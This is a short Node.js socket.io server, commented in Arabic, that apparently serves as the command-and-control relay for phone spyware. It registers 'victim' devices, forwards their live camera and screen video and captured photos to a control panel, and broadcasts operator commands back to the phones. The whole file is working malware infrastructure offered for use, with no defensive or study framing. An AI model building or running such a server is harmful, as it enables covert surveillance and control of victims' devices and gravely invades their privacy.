const express = require('express');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http, {
    cors: { origin: "*" },
    maxHttpBufferSize: 1e8 
});

app.get('/', (req, res) => { res.sendFile(__dirname + '/index.html'); });

io.on('connection', (socket) => {
    console.log('[-] مستخدم جديد متصل');

    // استقبال التبليغ من الهاتف وإرساله للوحة التحكم
    socket.on('victim_online', (data) => {
        console.log('[!] تبليغ جديد من: ' + data.model);
        io.emit('new_victim_alert', { id: socket.id, model: data.model });
    });

    // تمرير فريمات الفيديو (كاميرا وشاشة)
    socket.on('video_frame', (frame) => {
        socket.broadcast.emit('display_frame', { frame: frame });
    });

    // تمرير الصور الملتقطة
    socket.on('photo_captured', (img) => {
        socket.broadcast.emit('display_photo', { img: img });
    });

    // تمرير الأوامر للهاتف
    socket.on('admin_command', (data) => {
        io.emit(data.command, data); // إرسال الأمر للجميع لضمان وصوله للهاتف
    });
});

http.listen(process.env.PORT || 8080, '0.0.0.0', () => {
    console.log('🚀 Server is running on port ' + (process.env.PORT || 8080));
});
